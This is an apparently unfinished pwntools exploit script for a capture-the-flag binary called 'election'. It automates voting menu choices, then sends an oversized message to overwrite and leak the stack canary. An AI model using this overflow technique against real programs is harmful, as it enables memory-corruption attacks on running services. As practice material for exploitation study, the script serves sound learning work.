from pwn import *

context.clear(arch='x86_64')

r = process('./election')
# r = remote('', 10180)

# welcome
token = 'A' * 40

# accumulate vote for enough space to write buffer
def vote():
    for vote_cnt in range(0, 28):
        r.sendlineafter('>', '1')
        r.sendlineafter('Token: ', token)

        # in voting function
        for do_vote in range(0, 10):
            r.sendlineafter('>', '1')
            r.sendlineafter('9]: ', '0')

# write buffer to leak canary info
def buf_canary():
    r.sendlineafter('9]: ', '0')
    # try overwrite canary, msg[0xe0] and 8 bytes for 2 integers
    r.sendlineafter('Message: ', 'A' * 0xe8 + 'B' * 8)

r.sendlineafter('>', '2')
r.sendlineafter('Token: ', token)
vote()
buf_canary()
